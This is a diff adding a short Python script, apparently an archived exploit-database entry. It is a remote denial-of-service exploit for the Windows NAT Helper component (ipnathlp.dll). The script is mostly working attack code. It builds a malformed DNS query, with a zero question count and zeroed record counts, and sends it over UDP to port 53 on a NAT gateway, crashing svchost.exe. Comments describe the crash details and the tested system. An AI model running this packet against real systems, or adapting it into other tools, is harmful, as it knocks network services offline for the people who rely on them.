@@ -1,0 +1,43 @@
+#!/usr/bin/python
+# Microsoft Windows NAT Helper Components (ipnathlp.dll) 0day Remote DoS Exploit
+# Bug discovered by h07 <h07@interia.pl>
+# Tested on XP SP2 Polish
+# Details:
+#
+# Exploit(192.168.0.2) --> Microsoft NAT(192.168.0.1) --> [..Internet..]
+#
+# [Process svchost.exe, module ipnathlp]
+# --> MOV DL, [EAX]
+# Exception C0000005 (ACCESS_VIOLATION reading [00000000])
+##
+
+from socket import *
+from time import sleep
+
+host = "192.168.0.1"
+port = 53
+
+buffer = ( # DNS (query)
+"\x6c\xb6" # Transaction ID: 0x6cb6
+"\x01\x00" # Flags: 0x0100 (Standard query)
+"\x00\x00" # Questions: 0
+"\x00\x00" # Answer RRs: 0
+"\x00\x00" # Authority RRs: 0
+"\x00\x00" # Additional RRs: 0 <-- Bug is here (0, 0, 0, 0)
+"\x03\x77\x77\x77" #
+"\x06\x67\x6f\x6f" #
+"\x67\x6c\x65\x03" #
+"\x63\x6f\x6d\x00" # Name: www.google.com
+"\x00\x01" # Type: A (Host address)
+"\x00\x01" # Class: IN (0x0001)
+)
+
+s = socket(AF_INET, SOCK_DGRAM)
+s.connect((host, port))
+s.send(buffer)
+sleep(1)
+s.close()
+
+# EoF
+
+# milw0rm.com [2006-10-28]
